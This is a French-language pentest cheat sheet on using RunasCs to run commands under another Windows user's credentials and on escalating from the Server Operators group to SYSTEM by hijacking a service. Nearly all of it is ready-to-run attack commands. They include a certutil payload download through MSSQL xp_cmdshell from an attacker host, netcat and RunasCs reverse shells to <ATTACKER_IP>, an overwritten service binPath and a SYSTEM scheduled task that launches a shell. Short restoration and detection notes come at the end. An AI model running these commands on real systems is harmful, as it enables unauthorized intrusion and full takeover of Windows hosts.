# RunasCs

Exécution de processus avec credentials d'un autre utilisateur Windows.

## Installation

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
```

## Transfert sur cible

```bash
# Héberger
python3 -m http.server 8080

# Télécharger (via xp_cmdshell)
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/RunasCs.exe C:\temp\runascs.exe';
```

## Syntaxe

```cmd
RunasCs.exe <username> <password> <command> [options]
```

## Options

| Option | Description |
|--------|-------------|
| `-d <domain>` | Domaine |
| `-l <type>` | Logon type (9 par défaut) |
| `-r <host:port>` | Reverse shell |

### Logon Types

| Type | Usage |
|------|-------|
| 2 | Interactive |
| 3 | Network |
| 9 | NewCredentials (recommandé) |

## Exemples

### Commande simple

```cmd
RunasCs.exe Administrator "P@ssw0rd" whoami
RunasCs.exe Administrator "P@ssw0rd" "cmd /c dir C:\" -d DOMAIN
```

### Reverse Shell PowerShell

```bash
# Attaquant
nc -lvnp 4444

# Cible
RunasCs.exe Administrator "P@ssw0rd" powershell.exe -r <ATTACKER_IP>:4444
```

### Avec Netcat

```cmd
RunasCs.exe Administrator "P@ssw0rd" "C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444"
```

### Via MSSQL

```sql
-- Télécharger
EXEC xp_cmdshell 'mkdir C:\temp';
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>/RunasCs.exe C:\temp\runascs.exe';

-- Reverse shell
EXEC xp_cmdshell 'C:\temp\runascs.exe Administrator P@ssw0rd powershell.exe -r <ATTACKER_IP>:4444';
```

## Logon type spécifique

```cmd
# Interactive
RunasCs.exe user "pass" notepad.exe -l 2

# Network
RunasCs.exe user "pass" "net use \\server\share" -l 3

# NewCredentials
RunasCs.exe user "pass" cmd.exe -l 9
```

---

# Server Operators - Privilege Escalation

Exploitation du groupe **Server Operators** pour élever les privilèges vers SYSTEM via manipulation de services Windows.

## Prérequis

- Membre du groupe **Server Operators**
- Accès à la machine (WinRM, RDP, etc.)

## Vérification

### Check group membership

```powershell
whoami /groups

# Rechercher:
# BUILTIN\Server Operators     Alias     S-1-5-32-549
```

### Privileges du groupe

Le groupe **Server Operators** peut :
- Démarrer/arrêter services Windows
- Modifier la configuration des services
- Gérer les tâches planifiées

## Steps

### 1. Énumérer les services

```powershell
# Lister tous les services
services

# Lister avec détails
Get-Service | Select-Object Name, Status, StartType

# Chercher services non-System
Get-Service | Where-Object {$_.StartType -ne 'Disabled'}
```

### 2. Upload netcat

```bash
# Sur attaquant
python3 -m http.server 8080

# Sur cible
upload /path/to/nc.exe C:\temp\nc.exe
```

**Via WinRM :**
```powershell
*Evil-WinRM* PS> upload /home/user/nc.exe C:\temp\nc.exe
```

### 3. Identifier un service modifiable

```powershell
# Chercher un service qui peut être modifié
Get-Service | Where-Object {$_.Status -eq 'Running'}

# Exemples de services cibles:
# - VMTools
# - VGAuthService  
# - Spooler
```

### 4. Arrêter le service

```powershell
sc.exe stop VMTools

# ou
Stop-Service -Name VMTools
```

### 5. Modifier le binPath

```powershell
sc.exe config VMTools binPath="C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444"
```

### 6. Lancer listener

```bash
# Sur attaquant
nc -lvnp 4444
```

### 7. Démarrer le service

```powershell
sc.exe start VMTools
```

**Résultat :** Reverse shell en tant que **NT AUTHORITY\SYSTEM**

## Alternative : Scheduled Task

Si modification de service échoue, créer une tâche planifiée :

```powershell
# Créer tâche en tant que SYSTEM
schtasks /create /tn "UpdateTask" /tr "C:\temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444" /sc onstart /ru SYSTEM

# Exécuter
schtasks /run /tn "UpdateTask"
```

## Exemples de services

| Service | Nom | Description |
|---------|-----|-------------|
| VMTools | VMware Tools | Souvent présent sur VMs |
| VGAuthService | VMware Auth | Service VMware |
| Spooler | Print Spooler | Service d'impression |

## Restauration

```powershell
# Arrêter le service modifié
sc.exe stop VMTools

# Restaurer le binPath original
sc.exe config VMTools binPath="C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

# Redémarrer
sc.exe start VMTools
```

## Détection

- Event ID **7045** : Nouveau service installé
- Event ID **7040** : Service start type changed
- Modification suspecte de binPath
- Services pointant vers nc.exe, cmd.exe, powershell.exe

## Notes

- Server Operators = groupe puissant souvent oublié
- Alternative à SeBackupPrivilege, SeRestorePrivilege
- Valable sur Domain Controllers également
